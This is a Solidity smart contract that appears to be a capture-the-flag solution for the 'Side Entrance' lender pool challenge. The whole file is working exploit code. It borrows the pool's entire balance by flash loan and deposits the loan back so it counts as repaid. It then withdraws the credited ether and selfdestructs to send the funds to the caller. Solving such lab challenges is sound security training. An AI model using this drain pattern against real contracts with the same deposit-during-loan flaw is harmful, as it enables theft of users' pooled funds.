// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceLenderPoolExp is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;

    constructor(SideEntranceLenderPool _pool) payable {
        pool = _pool;
    }

    function exp() external {
        pool.flashLoan(address(pool).balance);
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    function withdraw() external {
        pool.withdraw();
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}
}
